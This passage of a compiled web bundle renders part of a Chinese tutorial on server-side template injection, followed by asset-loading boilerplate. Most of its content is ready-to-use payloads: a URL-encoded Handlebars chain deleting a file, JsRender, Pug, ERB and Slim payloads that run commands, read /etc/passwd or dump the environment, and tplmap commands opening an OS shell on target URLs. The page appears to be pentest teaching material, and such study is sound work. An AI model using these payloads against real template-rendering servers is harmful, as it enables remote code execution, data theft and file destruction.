{{/with}}\n{{/with}}\n\nURL\u7f16\u7801:\n%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d\n'})}),"\n",(0,l.jsx)(n.h3,{id:"jsrender",children:"JsRender"}),"\n",(0,l.jsx)(n.p,{children:"XSS\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}\n"})}),"\n",(0,l.jsx)(n.p,{children:"RCE:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-jinja2",children:"{{:\"pwnd\".toString.constructor.call({},\"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()\")()}}\n"})}),"\n",(0,l.jsx)(n.h3,{id:"pugjs",children:"PugJs"}),"\n",(0,l.jsx)(n.p,{children:"\u57fa\u7840"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"#{7*7} = 49\n"})}),"\n",(0,l.jsx)(n.p,{children:"RCE:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad(\"child_process\").exec('touch /tmp/pwned.txt')}()}\n"})}),"\n",(0,l.jsx)(n.h2,{id:"ruby\u4e2d\u7684ssti",children:"Ruby\u4e2d\u7684SSTI"}),"\n",(0,l.jsx)(n.h3,{id:"erb",children:"ERB"}),"\n",(0,l.jsx)(n.p,{children:"\u57fa\u7840\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-erb",children:"{{7*7}} = {{7*7}}\n${7*7} = ${7*7}\n<%= 7*7 %> = 49\n<%= foobar %> = Error\n"})}),"\n",(0,l.jsx)(n.p,{children:"\u9ad8\u7ea7\uff1a"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-erb",children:"<%= system(\"whoami\") %> #Execute code\n<%= Dir.entries('/') %> #List folder\n<%= File.open('/etc/passwd').read %> #Read file\n\n<%= system('cat /etc/passwd') %>\n<%= `ls /` %>\n<%= IO.popen('ls /').readlines()  %>\n<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>\n<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>\n"})}),"\n",(0,l.jsx)(n.h3,{id:"slim",children:"Slim"}),"\n",(0,l.jsx)(n.p,{children:"Payload:"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{children:"{ 7 * 7 }\n{ %x|env| }\n"})}),"\n",(0,l.jsx)(n.h2,{id:"\u81ea\u52a8\u5316\u5de5\u5177",children:"\u81ea\u52a8\u5316\u5de5\u5177"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsxs)(n.li,{children:["\n",(0,l.jsx)(n.p,{children:(0,l.jsx)(n.a,{href:"https://github.com/epinna/tplmap",children:"tplmap"})}),"\n",(0,l.jsx)(n.p,{children:"\u652f\u6301\u4e00\u952egetshell"}),"\n",(0,l.jsx)(n.p,{children:"\u652f\u6301\u6a21\u7248\u5f15\u64ce\u5217\u8868\uff1a"}),"\n",(0,l.jsxs)(n.table,{children:[(0,l.jsx)(n.thead,{children:(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.th,{children:"Engine"}),(0,l.jsx)(n.th,{children:"Remote Command Execution"}),(0,l.jsx)(n.th,{children:"Blind"}),(0,l.jsx)(n.th,{children:"Code evaluation"}),(0,l.jsx)(n.th,{children:"File read"}),(0,l.jsx)(n.th,{children:"File write"})]})}),(0,l.jsxs)(n.tbody,{children:[(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Mako"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Python"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Jinja2"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Python"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Python (code eval)"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Python"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Tornado"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Python"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Nunjucks"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Pug"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"doT"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Marko"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"JavaScript (code eval)"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsxs)(n.td,{children:["Dust (",(0,l.jsx)(n.code,{children:"<="})," dustjs-helpers@1.5.0)"]}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"EJS"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"JavaScript"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Ruby (code eval)"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Ruby"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Slim"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Ruby"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"ERB"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Ruby"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Smarty (unsecured)"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"PHP"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"PHP (code eval)"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"PHP"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsxs)(n.td,{children:["Twig (",(0,l.jsx)(n.code,{children:"<="}),"1.19)"]}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"PHP"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Freemarker"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Java"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Velocity"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"Java"}),(0,l.jsx)(n.td,{children:"\u2713"}),(0,l.jsx)(n.td,{children:"\u2713"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Twig (>1.19)"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Smarty (secured)"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"})]}),(0,l.jsxs)(n.tr,{children:[(0,l.jsx)(n.td,{children:"Dust (> dustjs-helpers@1.5.0)"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"}),(0,l.jsx)(n.td,{children:"\xd7"})]})]})]}),"\n",(0,l.jsx)(n.p,{children:"\u4f7f\u7528"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-bash",children:'python2.7 ./tplmap.py -u \'http://www.target.com/page?name=John*\' --os-shell\npython2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"\npython2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade\n'})}),"\n"]}),"\n"]}),"\n",(0,l.jsx)(n.h2,{id:"\u53c2\u8003-2",children:"\u53c2\u8003"}),"\n",(0,l.jsxs)(n.ul,{children:["\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://www.cnblogs.com/bmjoker/p/13508538.html",children:"1. SSTI\uff08\u6a21\u677f\u6ce8\u5165\uff09\u6f0f\u6d1e\uff08\u5165\u95e8\u7bc7\uff09"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection",children:"SSTI (Server Side Template Injection)"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection",children:"Server Side Template Injection"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://portswigger.net/web-security/server-side-template-injection",children:"Server-side template injection"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://portswigger.net/research/server-side-template-injection",children:"Server-Side Template Injection"})}),"\n",(0,l.jsx)(n.li,{children:(0,l.jsx)(n.a,{href:"https://www.indusface.com/learning/server-side-template-injectionssti/",children:"Server-Side Template Injection(SSTI)"})}),"\n"]})]})}function j(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(h,{...e})}):h(e)}},28453:(e,n,s)=>{s.d(n,{R:()=>d,x:()=>c});var i=s(96540);const l={},r=i.createContext(l);function d(e){const n=i.useContext(r);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(l):e.components||l:d(e.components),i.createElement(r.Provider,{value:n},e.children)}},35767:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104113823340-1a607382b9d02ee749b470405fe860b3.png"},36988:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/template-engine-example-20211104111712941-95bb778474903845479b23d2b066e95c.png"},38730:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104113918775-d6bf6a2623e434e86d7e7d5c73512f61.png"},50359:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104114042081-b253b8ae8b7596d073e89ec01ee0e9f6.png"},50807:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/server-side-template-injection-ssti-27887ac06c4a959e720de175693c13a8.png"},56160:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104113759413-2347d9e22018b1cdc7864df1ef1ff6ee.png"},65509:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/1344396-20200911174631687-758048107-20211104113112469-c3223a7daddcdc753e082b5ac09c6d1f.png"},71958:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104114023078-016115c9cf94db34dc8150628bf61331.png"},73068:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/1634182337441-d00689bf-3ff6-4ac4-bdea-9a12b20b1ee9-20211104112635778-c687fc5fa28ee8efdb71a7f78cc74197.png"},86444:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image-20211104114007489-4d91bed6408cf72a0a214b075c31d391.png"},92340:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/screen-shot-2015-07-20-at-09-21-56-403b462b5f3e0fca09bc6ee145404521.png"}}]);